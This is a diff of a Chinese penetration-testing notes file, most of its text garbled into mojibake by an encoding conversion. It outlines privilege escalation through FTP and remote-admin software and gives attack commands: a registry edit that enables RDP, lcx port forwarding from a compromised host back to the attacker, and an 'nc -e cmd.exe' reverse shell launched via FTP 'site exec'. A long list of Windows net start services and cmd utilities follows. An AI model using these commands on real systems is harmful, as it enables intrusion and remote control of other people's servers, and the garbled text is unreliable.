+	5.FlashFXPææƒ
 	{
 		
 	}
-	7.Xlight FTP ServerÌáÈ¨
+	6.PcAnywhereææƒ
+	{
+		
+	}
+	7.Xlight FTP Serverææƒ
 	{
 		
 	}
 }
-£¨Èı£©·şÎñÆ÷¹ÜÀíÈí¼şÌáÈ¨
+ï¼ˆä¸‰ï¼‰æœåŠ¡å™¨ç®¡ç†è½¯ä»¶ææƒ
 {
-	Ô¶³ÌÈí¼şÌáÈ¨
+	è¿œç¨‹è½¯ä»¶ææƒ
 	vnc
 	teamviewer
 	radmin
-	Magic WinmailÌáÈ¨
+	Magic Winmailææƒ
 
-	navicatÌáÈ¨
+	navicatææƒ
 	zend
-	ËÑ¹·ÊäÈë·¨ÌáÈ¨
-	ÀûÓÃ360ÌáÈ¨
+	æœç‹—è¾“å…¥æ³•ææƒ
+	åˆ©ç”¨360ææƒ
 }
-ÌáÈ¨¸¨Öú
+ææƒè¾…åŠ©
 {
-	¿ª3389.exe
+	å¼€3389.exe
 		REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  
 		3389.bat
-	¶Ë¿Ú×ª·¢£ºÄÚÍø»·¾³
+	ç«¯å£è½¬å‘ï¼šå†…ç½‘ç¯å¢ƒ
 	{
 		lcx.exe 
 		{
-			¾ßÌåÊ¹ÓÃ·½·¨£º
-			±¾µØ lcx -listen 51 33891  //¼àÌı±¾µØ51¶Ë¿Ú£¬½«51¶Ë¿ÚÁ÷Á¿×ª·¢µ½33891¶Ë¿Ú
-			Èâ¼¦ lcx -slave ±¾»úip 51 Èâ¼¦ 3389 //½«±¾µØ3389¶Ë¿ÚÁ÷Á¿×ª·¢±¾»úipµÄ51¶Ë¿Ú
+			å…·ä½“ä½¿ç”¨æ–¹æ³•ï¼š
+			æœ¬åœ° lcx -listen 51 33891  //ç›‘å¬æœ¬åœ°51ç«¯å£ï¼Œå°†51ç«¯å£æµé‡è½¬å‘åˆ°33891ç«¯å£
+			è‚‰é¸¡ lcx -slave æœ¬æœºip 51 è‚‰é¸¡ 3389 //å°†æœ¬åœ°3389ç«¯å£æµé‡è½¬å‘æœ¬æœºipçš„51ç«¯å£
 		}
 		nc.exe
 		{
-			ncÔÚ±¾µØ¼àÌı1340¶Ë¿Ú£¬nc -l -p 1340
-			ÔÚcmdÏÂÖ´ĞĞ quote site exec "c:\nc.exe -e cmd.exe *.*.*.* 1340"
+			ncåœ¨æœ¬åœ°ç›‘å¬1340ç«¯å£ï¼Œnc -l -p 1340
+			åœ¨cmdä¸‹æ‰§è¡Œ quote site exec "c:\nc.exe -e cmd.exe *.*.*.* 1340"
 			net user
-			cacls c:\windows\system32\net.exe²é¿´ÏÂnetµÄÈ¨ÏŞÉèÖÃ
+			cacls c:\windows\system32\net.exeæŸ¥çœ‹ä¸‹netçš„æƒé™è®¾ç½®
 		}
 	}
-	DLL½Ù³Ö
+	DLLåŠ«æŒ
 }
 }
 
-CMDÃüÁîÏê½â	
+CMDå‘½ä»¤è¯¦è§£	
 {
-³£ÓÃCMD
-scÃüÁî
-	scÊÇÓÃÓÚÓë·şÎñ¿ØÖÆ¹ÜÀíÆ÷ºÍ·şÎñ½øĞĞÍ¨ĞÅµÄÃüÁîĞĞ³ÌĞò
-	Óï·¨ÊÇ£º
-		sc config ·şÎñÃû start= demand     //ÊÖ¶¯
-		sc condig ·şÎñÃû start= auto       //×Ô¶¯
-		sc config ·şÎñÃû start= disabled //½ûÓÃ
-		sc start ·şÎñÃû
-		sc stop ·şÎñÃû
+å¸¸ç”¨CMD
+scå‘½ä»¤
+	scæ˜¯ç”¨äºä¸æœåŠ¡æ§åˆ¶ç®¡ç†å™¨å’ŒæœåŠ¡è¿›è¡Œé€šä¿¡çš„å‘½ä»¤è¡Œç¨‹åº
+	è¯­æ³•æ˜¯ï¼š
+		sc config æœåŠ¡å start= demand     //æ‰‹åŠ¨
+		sc condig æœåŠ¡å start= auto       //è‡ªåŠ¨
+		sc config æœåŠ¡å start= disabled //ç¦ç”¨
+		sc start æœåŠ¡å
+		sc stop æœåŠ¡å
 		
-Net start/stop ÃüÁîÏê½â
+Net start/stop å‘½ä»¤è¯¦è§£
 
-	¹¦ÄÜ£ºÆô¶¯·şÎñ£¬»òÏÔÊ¾ÒÑÆô¶¯·şÎñµÄÁĞ±í¡£Á½¸ö»ò¶à¸ö´Ê×é³ÉµÄ·şÎñÃû£¬ÀıÈç Net Logon »ò Computer Browser£¬±ØĞëÁ½±ß¼ÓÒıºÅ¡£
-	¸ñÊ½£ºnet start [service]
-	¼üÈë²»´ø²ÎÊıµÄ net start ÏÔÊ¾ÕıÔÚÔËĞĞ·şÎñµÄÁĞ±í¡£
+	åŠŸèƒ½ï¼šå¯åŠ¨æœåŠ¡ï¼Œæˆ–æ˜¾ç¤ºå·²å¯åŠ¨æœåŠ¡çš„åˆ—è¡¨ã€‚ä¸¤ä¸ªæˆ–å¤šä¸ªè¯ç»„æˆçš„æœåŠ¡åï¼Œä¾‹å¦‚ Net Logon æˆ– Computer Browserï¼Œå¿…é¡»ä¸¤è¾¹åŠ å¼•å·ã€‚
+	æ ¼å¼ï¼šnet start [service]
+	é”®å…¥ä¸å¸¦å‚æ•°çš„ net start æ˜¾ç¤ºæ­£åœ¨è¿è¡ŒæœåŠ¡çš„åˆ—è¡¨ã€‚
 
-	service£º
-		°üÀ¨ alerter¡¢client service for netware¡¢clipbook server¡¢content index¡¢computer browser¡¢dhcp client¡¢directory replicator¡¢eventlog¡¢ftp publishing service¡¢
-			hypermedia object manager¡¢logical disk manager¡¢lpdsvc¡¢media services management, messenger¡¢Fax Service¡¢Microsoft install server¡¢net logon¡¢network dde¡¢network dde dsdm¡¢nt lm security support provider¡¢ole¡¢plug and play¡¢remote access connection manager¡¢remote access isnsap service¡¢remote access server¡¢remote procedure call (rpc) locator¡¢remote procedure call (rpc) service¡¢schedule¡¢server¡¢simple tcp/ip services¡¢site server ldap service¡¢smartcard resource manager¡¢snmp¡¢spooler¡¢task scheduler¡¢tcp/ip netbios helper¡¢telephony service¡¢tracking service¡¢tracking (server) service¡¢ups¡¢Windows time service ºÍworkstation¡£
-		ÏÂÃæ·şÎñÖ»ÓĞÔÚ Windows 2000 ÉÏ¿ÉÓÃ£ºfile service for macintosh¡¢gateway service for netware¡¢microsoft dhcp service¡¢print service for macintosh¡¢windows internet name service¡£
-	·şÎñËµÃ÷
+	serviceï¼š
+		åŒ…æ‹¬ alerterã€client service for netwareã€clipbook serverã€content indexã€computer browserã€dhcp clientã€directory replicatorã€eventlogã€ftp publishing serviceã€
+			hypermedia object managerã€logical disk managerã€lpdsvcã€media services management, messengerã€Fax Serviceã€Microsoft install serverã€net logonã€network ddeã€network dde dsdmã€nt lm security support providerã€oleã€plug and playã€remote access connection managerã€remote access isnsap serviceã€remote access serverã€remote procedure call (rpc) locatorã€remote procedure call (rpc) serviceã€scheduleã€serverã€simple tcp/ip servicesã€site server ldap serviceã€smartcard resource managerã€snmpã€spoolerã€task schedulerã€tcp/ip netbios helperã€telephony serviceã€tracking serviceã€tracking (server) serviceã€upsã€Windows time service å’Œworkstationã€‚
+		ä¸‹é¢æœåŠ¡åªæœ‰åœ¨ Windows 2000 ä¸Šå¯ç”¨ï¼šfile service for macintoshã€gateway service for netwareã€microsoft dhcp serviceã€print service for macintoshã€windows internet name serviceã€‚
+	æœåŠ¡è¯´æ˜
 		Net start Alerter
-		Æô¶¯¡°¾¯±¨Æ÷¡±·şÎñ¡£¡°¾¯±¨Æ÷¡±·şÎñ·¢ËÍ¾¯¸æÏûÏ¢¡£
+		å¯åŠ¨â€œè­¦æŠ¥å™¨â€æœåŠ¡ã€‚â€œè­¦æŠ¥å™¨â€æœåŠ¡å‘é€è­¦å‘Šæ¶ˆæ¯ã€‚
 		Net start Alerter
 		Net start Client Service for NetWare
-		Æô¶¯¡°NetWare ¿Í»§·şÎñ¡±¡£¸ÃÃüÁîÖ»ÓĞÔÚ°²×°ÁË NetWare ¿Í»§·şÎñµÄÇé¿öÏÂ²ÅÄÜÔÚ Wind
-		ows 2000 Professional ÉÏÊ¹ÓÃ¡£
+		å¯åŠ¨â€œNetWare å®¢æˆ·æœåŠ¡â€ã€‚è¯¥å‘½ä»¤åªæœ‰åœ¨å®‰è£…äº† NetWare å®¢æˆ·æœåŠ¡çš„æƒ…å†µä¸‹æ‰èƒ½åœ¨ Wind
+		ows 2000 Professional ä¸Šä½¿ç”¨ã€‚
 		net start "client service for netware"
 		Net start ClipBook Server
-		Æô¶¯¡°¼ôÌù²¾·şÎñÆ÷¡±·şÎñ¡£Á½¸öµ¥´Ê×é³ÉµÄ·şÎñÃû£¬ÀıÈç ClipBook Server£¬±ØĞëÁ½±ß¼Ó
-		ÒıºÅ ("¡£
+		å¯åŠ¨â€œå‰ªè´´ç°¿æœåŠ¡å™¨â€æœåŠ¡ã€‚ä¸¤ä¸ªå•è¯ç»„æˆçš„æœåŠ¡åï¼Œä¾‹å¦‚ ClipBook Serverï¼Œå¿…é¡»ä¸¤è¾¹åŠ 
+		å¼•å· ("ã€‚
 		net start "clipbook server"
 
 		Net start Computer Browser
-		Æô¶¯¡°¼ÆËã»úä¯ÀÀÆ÷¡±·şÎñ¡£
+		å¯åŠ¨â€œè®¡ç®—æœºæµè§ˆå™¨â€æœåŠ¡ã€‚
 		net start "computer browser"
 
 		Net start DHCP Client
-		Æô¶¯¡°DHCP ¿Í»§¡±·şÎñ¡£¸ÃÃüÁîÖ»ÓĞÔÚ°²×°ÁË TCP/IP Ğ­ÒéÖ®ºó²Å¿ÉÓÃ¡£
+		å¯åŠ¨â€œDHCP å®¢æˆ·â€æœåŠ¡ã€‚è¯¥å‘½ä»¤åªæœ‰åœ¨å®‰è£…äº† TCP/IP åè®®ä¹‹åæ‰å¯ç”¨ã€‚
 		net start "dhcp client"
 
 		Net start Directory Replicator
-		Æô¶¯¡°Ä¿Â¼¸´ÖÆ³ÌĞò¡±·şÎñ¡£¡°Ä¿Â¼¸´ÖÆ³ÌĞò¡±·şÎñ½«Ö¸¶¨µÄÎÄ¼ş¸´ÖÆµ½Ö¸¶¨·şÎñÆ÷ÉÏ¡£Á½
-		¸ö´Ê×é³ÉµÄ·şÎñÃû£¬ÀıÈç Directory Replicator£¬±ØĞëÁ½±ß¼ÓÒıºÅ ("¡£Ò²¿ÉÒÔÓÃÃüÁî net
-		start replicator Æô¶¯¸Ã·şÎñ¡£
+		å¯åŠ¨â€œç›®å½•å¤åˆ¶ç¨‹åºâ€æœåŠ¡ã€‚â€œç›®å½•å¤åˆ¶ç¨‹åºâ€æœåŠ¡å°†æŒ‡å®šçš„æ–‡ä»¶å¤åˆ¶åˆ°æŒ‡å®šæœåŠ¡å™¨ä¸Šã€‚ä¸¤
+		ä¸ªè¯ç»„æˆçš„æœåŠ¡åï¼Œä¾‹å¦‚ Directory Replicatorï¼Œå¿…é¡»ä¸¤è¾¹åŠ å¼•å· ("ã€‚ä¹Ÿå¯ä»¥ç”¨å‘½ä»¤ net
+		start replicator å¯åŠ¨è¯¥æœåŠ¡ã€‚
 		net start "directory replicator"
 
 		Net start Eventlog
-		Æô¶¯¡°ÊÂ¼şÈÕÖ¾¡±·şÎñ£¬¸Ã·şÎñ½«ÊÂ¼ş¼ÇÂ¼ÔÚ±¾µØ¼ÆËã»úÉÏ¡£±ØĞëÔÚÊ¹ÓÃÊÂ¼ş²é¿´Æ÷²é¿´¼Ç
-		Â¼µÄÊÂ¼şÖ®Ç°Æô¶¯¸Ã·şÎñ¡£
+		å¯åŠ¨â€œäº‹ä»¶æ—¥å¿—â€æœåŠ¡ï¼Œè¯¥æœåŠ¡å°†äº‹ä»¶è®°å½•åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šã€‚å¿…é¡»åœ¨ä½¿ç”¨äº‹ä»¶æŸ¥çœ‹å™¨æŸ¥çœ‹è®°
+		å½•çš„äº‹ä»¶ä¹‹å‰å¯åŠ¨è¯¥æœåŠ¡ã€‚
 		net start Eventlog
 
 		Net start File Server for Macintosh
-		Æô¶¯ Macintosh ÎÄ¼ş·şÎñ£¬ÔÊĞí Macintosh ¼ÆËã»úÊ¹ÓÃ¹²ÏíÎÄ¼ş¡£¸ÃÃüÁîÖ»ÄÜÔÚÔËĞĞ Win
-		dows 2000 Server µÄ¼ÆËã»úÉÏ¿ÉÓÃ¡£
+		å¯åŠ¨ Macintosh æ–‡ä»¶æœåŠ¡ï¼Œå…è®¸ Macintosh è®¡ç®—æœºä½¿ç”¨å…±äº«æ–‡ä»¶ã€‚è¯¥å‘½ä»¤åªèƒ½åœ¨è¿è¡Œ Win
+		dows 2000 Server çš„è®¡ç®—æœºä¸Šå¯ç”¨ã€‚
 		net start "file service for macintosh"
 		Net start FTP Publishing Service
-		Æô¶¯ FTP ·¢²¼·şÎñ¡£¸ÃÃüÁîÖ»ÓĞÔÚ°²×°ÁË Internet ĞÅÏ¢·şÎñºó²Å¿ÉÓÃ¡£
+		å¯åŠ¨ FTP å‘å¸ƒæœåŠ¡ã€‚è¯¥å‘½ä»¤åªæœ‰åœ¨å®‰è£…äº† Internet ä¿¡æ¯æœåŠ¡åæ‰å¯ç”¨ã€‚
 		net start "ftp publishing service"
 		Net start Gateway Service for NetWare
-		Æô¶¯ NetWare Íø¹Ø·şÎñ¡£¸ÃÃüÁîÖ»ÓĞÔÚ°²×°ÁË NetWare Íø¹Ø·şÎñµÄÇé¿öÏÂ²ÅÄÜÔÚ Windows
-		2000 Server ÉÏ¿ÉÓÃ¡£
+		å¯åŠ¨ NetWare ç½‘å…³æœåŠ¡ã€‚è¯¥å‘½ä»¤åªæœ‰åœ¨å®‰è£…äº† NetWare ç½‘å…³æœåŠ¡çš„æƒ…å†µä¸‹æ‰èƒ½åœ¨ Windows
+		2000 Server ä¸Šå¯ç”¨ã€‚
 		net start "gateway service for netware"
 		Net start Lpdsvc
-		Æô¶¯ TCP/IP ´òÓ¡·şÎñÆ÷·şÎñ¡£¸ÃÃüÁîÖ»ÓĞÔÚ UNIX ´òÓ¡·şÎñºÍ TCP/IP Ğ­Òé°²×°ºó·½¿ÉÊ¹
-		ÓÃ¡£
+		å¯åŠ¨ TCP/IP æ‰“å°æœåŠ¡å™¨æœåŠ¡ã€‚è¯¥å‘½ä»¤åªæœ‰åœ¨ UNIX æ‰“å°æœåŠ¡å’Œ TCP/IP åè®®å®‰è£…åæ–¹å¯ä½¿
+		ç”¨ã€‚
 		net start lpdsvc
 
 		Net start Messenger
-		Æô¶¯¡°ĞÅÊ¹¡±·şÎñ¡£¡°ĞÅÊ¹¡±?ñÔÊĞí¼ÆËã»?ÓÊÕÓÊ¼??
+		å¯åŠ¨â€œä¿¡ä½¿â€æœåŠ¡ã€‚â€œä¿¡ä½¿â€?è£¨å¸‚ç ‘æ‰‘æ…Š?é‚®æ²¼å§‹??
 		net start messenger
 
 		Net start Microsoft DHCP Service
-		Æô¶¯ Microsoft DHCP ·şÎñ¡£¸ÃÃüÁîÖ»ÓĞÔÚÔËĞĞ Windows 2000 Server ²¢ÇÒÒÑ°²×° TCP/IP
-		Ğ­ÒéºÍ DHCP ·şÎñµÄÇé¿öÏÂ²Å¿ÉÓÃ¡£
+		å¯åŠ¨ Microsoft DHCP æœåŠ¡ã€‚è¯¥å‘½ä»¤åªæœ‰åœ¨è¿è¡Œ Windows 2000 Server å¹¶ä¸”å·²å®‰è£… TCP/IP
+		åè®®å’Œ DHCP æœåŠ¡çš„æƒ…å†µä¸‹æ‰å¯ç”¨ã€‚
 		net start "microsoft dhcp service"
 
 		Net start Net Logon
-		Æô¶¯¡°ÍøÂçµÇÂ¼¡±·şÎñ¡£¡°ÍøÂçµÇÂ¼¡±·şÎñÑéÖ¤µÇÂ¼ÇëÇó²¢¿ØÖÆ¸´ÖÆÓÃ»§ÕÊ»§Êı¾İ¿âÓò¿í¡£
-		Á½¸ö´Ê×é³ÉµÄ·şÎñÃû£¬ÀıÈç Net Logon£¬±ØĞëÁ½±ß¼ÓÒıºÅ ("¡£¸Ã·şÎñÒ²¿ÉÒÔÊ¹ÓÃÃüÁî net
-		start netlogon Æô¶¯¡£
+		å¯åŠ¨â€œç½‘ç»œç™»å½•â€æœåŠ¡ã€‚â€œç½‘ç»œç™»å½•â€æœåŠ¡éªŒè¯ç™»å½•è¯·æ±‚å¹¶æ§åˆ¶å¤åˆ¶ç”¨æˆ·å¸æˆ·æ•°æ®åº“åŸŸå®½ã€‚
+		ä¸¤ä¸ªè¯ç»„æˆçš„æœåŠ¡åï¼Œä¾‹å¦‚ Net Logonï¼Œå¿…é¡»ä¸¤è¾¹åŠ å¼•å· ("ã€‚è¯¥æœåŠ¡ä¹Ÿå¯ä»¥ä½¿ç”¨å‘½ä»¤ net
+		start netlogon å¯åŠ¨ã€‚
 		net start "net logon"
 
 		Net start Network DDE
-		Æô¶¯¡°ÍøÂç DDE¡±·şÎñ¡£
+		å¯åŠ¨â€œç½‘ç»œ DDEâ€æœåŠ¡ã€‚
 		net start "network dde"
 		Net start NT LM Security Support Provider
-		Æô¶¯¡°NT LM °²È«Ö§³ÖÌá¹©³ÌĞò¡±·şÎñ¡£¸ÃÃüÁîÖ»ÓĞÔÚ°²×°ÁË¡°NT LM °²È«Ö§³ÖÌá¹©³ÌĞò¡±
-		ºó²Å¿ÉÓÃ¡£
+		å¯åŠ¨â€œNT LM å®‰å…¨æ”¯æŒæä¾›ç¨‹åºâ€æœåŠ¡ã€‚è¯¥å‘½ä»¤åªæœ‰åœ¨å®‰è£…äº†â€œNT LM å®‰å…¨æ”¯æŒæä¾›ç¨‹åºâ€
+		åæ‰å¯ç”¨ã€‚
 		net start "nt lm security support provider"
 		Net start OLE
-		Æô¶¯¶ÔÏóÁ´½ÓºÍÇ¶Èë·şÎñ¡£
+		å¯åŠ¨å¯¹è±¡é“¾æ¥å’ŒåµŒå…¥æœåŠ¡ã€‚
 		net start ole
 		Net start Print Server for Macintosh
-		Æô¶¯ Macintosh ´òÓ¡·şÎñÆ÷·şÎñ£¬ÔÊĞí´Ó Macintosh ¼ÆËã»ú´òÓ¡¡£¸ÃÃüÁîÖ»ÄÜÔÚÔËĞĞ Win
-		dows 2000 Server µÄ¼ÆËã»úÉÏ¿ÉÓÃ¡£
+		å¯åŠ¨ Macintosh æ‰“å°æœåŠ¡å™¨æœåŠ¡ï¼Œå…è®¸ä» Macintosh è®¡ç®—æœºæ‰“å°ã€‚è¯¥å‘½ä»¤åªèƒ½åœ¨è¿è¡Œ Win
+		dows 2000 Server çš„è®¡ç®—æœºä¸Šå¯ç”¨ã€‚
 		net start "print server for macintosh"
 		Net start Remote Access Connection Manager
-		Æô¶¯¡°Ô¶³Ì·ÃÎÊÁ¬½Ó¹ÜÀíÆ÷¡±·şÎñ¡£¸ÃÃüÁîÖ»ÓĞÔÚ°²×°ÁË¡°Ô¶³Ì·ÃÎÊ·şÎñ¡±ºó²Å¿ÉÓÃ¡£
+		å¯åŠ¨â€œè¿œç¨‹è®¿é—®è¿æ¥ç®¡ç†å™¨â€æœåŠ¡ã€‚è¯¥å‘½ä»¤åªæœ‰åœ¨å®‰è£…äº†â€œè¿œç¨‹è®¿é—®æœåŠ¡â€åæ‰å¯ç”¨ã€‚
 		net start "remote access connection manager"
 		Net start Remote Access ISNSAP Service
-		Æô¶¯¡°Ô¶³Ì·ÃÎÊ ISNSAP ·şÎñ¡±¡£¸ÃÃüÁîÖ»ÓĞÔÚ°²×°ÁË¡°Ô¶³Ì·ÃÎÊ·şÎñ¡±ºó²Å¿ÉÓÃ¡£
+		å¯åŠ¨â€œè¿œç¨‹è®¿é—® ISNSAP æœåŠ¡â€ã€‚è¯¥å‘½ä»¤åªæœ‰åœ¨å®‰è£…äº†â€œè¿œç¨‹è®¿é—®æœåŠ¡â€åæ‰å¯ç”¨ã€‚
 		net start "remote access isnsap service"
 		Net start Remote Procedure Call (RPC) Locator
-		Æô¶¯ RPC ¶¨Î»Æ÷·şÎñ¡£¡°¶¨Î»Æ÷¡±·şÎñÊÇ Microsoft Windows 2000 µÄ RPC Ãû³Æ·şÎñ¡£
+		å¯åŠ¨ RPC å®šä½å™¨æœåŠ¡ã€‚â€œå®šä½å™¨â€æœåŠ¡æ˜¯ Microsoft Windows 2000 çš„ RPC åç§°æœåŠ¡ã€‚
 		net start "remote procedure call (rpc) locator"
 
 		Net start Remote Procedure Call (RPC) Service
-		Æô¶¯¡°Ô¶³Ì¹ı³Ìµ÷ÓÃ (RPC) ·şÎñ¡±¡£¡°Ô¶³Ì¹ı³Ìµ÷ÓÃ (RPC) ·şÎñ¡±ÊÇ Microsoft Windows
-		2000 µÄ RPC ×ÓÏµÍ³¡£RPC ×ÓÏµÍ³°üÀ¨ÖÕ½áµãÓ³ÉäÆ÷ºÍÆäËû¸÷ÖÖ RPC ·şÎñ¡£
+		å¯åŠ¨â€œè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ (RPC) æœåŠ¡â€ã€‚â€œè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ (RPC) æœåŠ¡â€æ˜¯ Microsoft Windows
+		2000 çš„ RPC å­ç³»ç»Ÿã€‚RPC å­ç³»ç»ŸåŒ…æ‹¬ç»ˆç»“ç‚¹æ˜ å°„å™¨å’Œå…¶ä»–å„ç§ RPC æœåŠ¡ã€‚
 		net start "remote procedure call (rpc) service"
 
 		Net start Schedule
-		Æô¶¯¡°¼Æ»®¡±·şÎñ¡£¡°¼Æ»®¡±·şÎñÊ¹¼ÆËã»ú¿ÉÒÔÊ¹ÓÃ at ÃüÁîÔÚÖ¸¶¨Ê±¼äÆô¶¯³ÌĞò¡£
+		å¯åŠ¨â€œè®¡åˆ’â€æœåŠ¡ã€‚â€œè®¡åˆ’â€æœåŠ¡ä½¿è®¡ç®—æœºå¯ä»¥ä½¿ç”¨ at å‘½ä»¤åœ¨æŒ‡å®šæ—¶é—´å¯åŠ¨ç¨‹åºã€‚
 		net start schedule
 
 		Net start Server
-		Æô¶¯¡°·şÎñÆ÷¡±·şÎñ¡£¡°·şÎñÆ÷¡±·şÎñÊ¹¼ÆËã»ú¿ÉÒÔ¹²ÏíÍøÂçÉÏµÄ×ÊÔ´¡£
+		å¯åŠ¨â€œæœåŠ¡å™¨â€æœåŠ¡ã€‚â€œæœåŠ¡å™¨â€æœåŠ¡ä½¿è®¡ç®—æœºå¯ä»¥å…±äº«ç½‘ç»œä¸Šçš„èµ„æºã€‚
 		net start server
 
 		Net start Simple TCP/IP Services
-		Æô¶¯¡°¼òµ¥ TCP/IP ·şÎñ¡±·şÎñ¡£¸ÃÃüÁîÖ»ÓĞÔÚ°²×°ÁË TCP/IP ºÍ¡°¼òµ¥ TCP/IP ·şÎñ¡±ºó
-		²Å¿ÉÒÔÊ¹ÓÃ¡£
+		å¯åŠ¨â€œç®€å• TCP/IP æœåŠ¡â€æœåŠ¡ã€‚è¯¥å‘½ä»¤åªæœ‰åœ¨å®‰è£…äº† TCP/IP å’Œâ€œç®€å• TCP/IP æœåŠ¡â€å
+		æ‰å¯ä»¥ä½¿ç”¨ã€‚
 		net start "simple tcp/ip services"
 		Net start Site Server LDAP Service
-		Æô¶¯¡°Site Server LDAP ·şÎñ¡±¡£¡°Site Server LDAP ·şÎñ¡±ÔÚ Windows 2000 Active D
+		å¯åŠ¨â€œSite Server LDAP æœåŠ¡â€ã€‚â€œSite Server LDAP æœåŠ¡â€åœ¨ Windows 2000 Active D
 
-		irectory ÖĞ·¢²¼ IP ¶à²¥»áÒé¡£¸ÃÃüÁîÖ»ÓĞÔÚ°²×°ÁË¡°Site Server LDAP ·şÎñ¡±ºó²Å¿ÉÒÔÊ¹
-		ÓÃ¡£
+		irectory ä¸­å‘å¸ƒ IP å¤šæ’­ä¼šè®®ã€‚è¯¥å‘½ä»¤åªæœ‰åœ¨å®‰è£…äº†â€œSite Server LDAP æœåŠ¡â€åæ‰å¯ä»¥ä½¿
+		ç”¨ã€‚
 		net start "site server ldap service"
 
 		Net start SNMP
-		Æô¶¯ SNMP ·şÎñ¡£SNMP ·şÎñÔÊĞí·şÎñÆ÷Ïò TCP/IP ÍøÂçÉÏµÄ SNMP ¹ÜÀíÏµÍ³±¨¸æµ±Ç°×´Ì¬¡£
-		¸ÃÃüÁîÖ»ÓĞÔÚ°²×°ÁË TCP/IP ºÍ SNMP ºó²Å¿ÉÒÔÊ¹ÓÃ¡£
+		å¯åŠ¨ SNMP æœåŠ¡ã€‚SNMP æœåŠ¡å…è®¸æœåŠ¡å™¨å‘ TCP/IP ç½‘ç»œä¸Šçš„ SNMP ç®¡ç†ç³»ç»ŸæŠ¥å‘Šå½“å‰çŠ¶æ€ã€‚
+		è¯¥å‘½ä»¤åªæœ‰åœ¨å®‰è£…äº† TCP/IP å’Œ SNMP åæ‰å¯ä»¥ä½¿ç”¨ã€‚
 		net start snmp
 
 		Net start Spooler
-		Æô¶¯¡°ºóÌ¨´òÓ¡³ÌĞò¡±¡£
+		å¯åŠ¨â€œåå°æ‰“å°ç¨‹åºâ€ã€‚
 		net start spooler
 		Net start TCP/IP NetBIOS Helper
-		ÔÚ TCP ·şÎñÉÏÆôÓÃ Netbios Ö§³Ö¡£¸ÃÃüÁîÖ»ÓĞÔÚ°²×°ÁË TCP/IP ²Å¿ÉÓÃ¡£
+		åœ¨ TCP æœåŠ¡ä¸Šå¯ç”¨ Netbios æ”¯æŒã€‚è¯¥å‘½ä»¤åªæœ‰åœ¨å®‰è£…äº† TCP/IP æ‰å¯ç”¨ã€‚
 		net start "tcp/ip netbios helper"
 		Net start UPS
-		Æô¶¯¡°²»¼ä¶ÏµçÔ´ (UPS)¡±·şÎñ
+		å¯åŠ¨â€œä¸é—´æ–­ç”µæº (UPS)â€æœåŠ¡
 		net start ups
 
 		Net start Windows Internet Name Service
-		Æô¶¯¡°Windows Internet ÃüÃû·şÎñ¡±¡£¸ÃÃüÁîÖ»ÓĞÔÚ°²×°ÁË TCP/IP ºÍ¡°Windows Interne
-		t ÃüÃû·şÎñ¡±ºóÔÚ Windows 2000 Servers ÉÏ²Å¿ÉÒÔÊ¹ÓÃ¡£
+		å¯åŠ¨â€œWindows Internet å‘½åæœåŠ¡â€ã€‚è¯¥å‘½ä»¤åªæœ‰åœ¨å®‰è£…äº† TCP/IP å’Œâ€œWindows Interne
+		t å‘½åæœåŠ¡â€ååœ¨ Windows 2000 Servers ä¸Šæ‰å¯ä»¥ä½¿ç”¨ã€‚
 		net start "windows internet name service"
 
 		Net start Workstation
-		Æô¶¯¡°¹¤×÷Õ¾¡±·şÎñ¡£¡°¹¤×÷Õ¾¡±·şÎñÊ¹¼ÆËã»ú¿ÉÒÔÁ¬½Ó²¢Ê¹ÓÃÍøÂç×ÊÔ´¡£
+		å¯åŠ¨â€œå·¥ä½œç«™â€æœåŠ¡ã€‚â€œå·¥ä½œç«™â€æœåŠ¡ä½¿è®¡ç®—æœºå¯ä»¥è¿æ¥å¹¶ä½¿ç”¨ç½‘ç»œèµ„æºã€‚
 		net start workstation
 		Net start Schedule
-		ÓĞµÄµØ·½³ÆÎª¡°¶¨Ê±¡±·şÎñ£¬½Ğ·¨²»Í¬£¬Çë´ó¼Ò×¢ÒâÁË£¬ÆäÊµÊÇÒ»»ØÊÂ£¡
+		æœ‰çš„åœ°æ–¹ç§°ä¸ºâ€œå®šæ—¶â€æœåŠ¡ï¼Œå«æ³•ä¸åŒï¼Œè¯·å¤§å®¶æ³¨æ„äº†ï¼Œå…¶å®æ˜¯ä¸€å›äº‹ï¼
 		Net start Telnet
-		Æô¶¯telnet·şÎñ£¬´ò¿ª23¶Ë¿Ú£¬ÓĞµÄÇé¿öÏÂĞèÏÈÔËĞĞNTLM.exe¡£ÎªÊ²Ã´£¿µ½éÅGµÄËµÃ÷ÀïÈ¥ÕÒ°É£¡ 	
+		å¯åŠ¨telnetæœåŠ¡ï¼Œæ‰“å¼€23ç«¯å£ï¼Œæœ‰çš„æƒ…å†µä¸‹éœ€å…ˆè¿è¡ŒNTLM.exeã€‚ä¸ºä»€ä¹ˆï¼Ÿåˆ°æ¦•Gçš„è¯´æ˜é‡Œå»æ‰¾å§ï¼ 	
 		
-cmdÃüÁî´óÈ«£¨ÏµÍ³ĞÅÏ¢ËÑ¼¯£©
-¡¡¡¡winver---------¼ì²éWindows°æ±¾
-¡¡¡¡wmimgmt.msc----´ò¿ªwindows¹ÜÀíÌåÏµ½á¹¹(WMI)
-¡¡¡¡wupdmgr--------windows¸üĞÂ³ÌĞò
-¡¡¡¡wscript--------windows½Å±¾ËŞÖ÷ÉèÖÃ
-¡¡¡¡write----------Ğ´×Ö°å
-¡¡¡¡winmsd---------ÏµÍ³ĞÅÏ¢
-¡¡¡¡wiaacmgr-------É¨ÃèÒÇºÍÕÕÏà»úÏòµ¼
-¡¡¡¡winchat--------XP×Ô´ø¾ÖÓòÍøÁÄÌì
-cmdÃüÁî´óÈ«£¨ÏµÍ³¹¦ÄÜ£©
-¡¡¡¡mem.exe--------ÏÔÊ¾ÄÚ´æÊ¹ÓÃÇé¿ö
-¡¡¡¡Msconfig.exe---ÏµÍ³ÅäÖÃÊµÓÃ³ÌĞò
-¡¡¡¡mplayer2-------¼òÒ×widnows media player
-¡¡¡¡mspaint--------»­Í¼°å
-¡¡¡¡mstsc----------Ô¶³Ì×ÀÃæÁ¬½Ó
-¡¡¡¡mplayer2-------Ã½Ìå²¥·Å»ú
-¡¡¡¡magnify--------·Å´ó¾µÊµÓÃ³ÌĞò
-¡¡¡¡mmc------------´ò¿ª¿ØÖÆÌ¨
-¡¡¡¡mobsync--------Í¬²½ÃüÁî
-cmdÃüÁî´óÈ«£¨Éè±¸¹ÜÀí£©
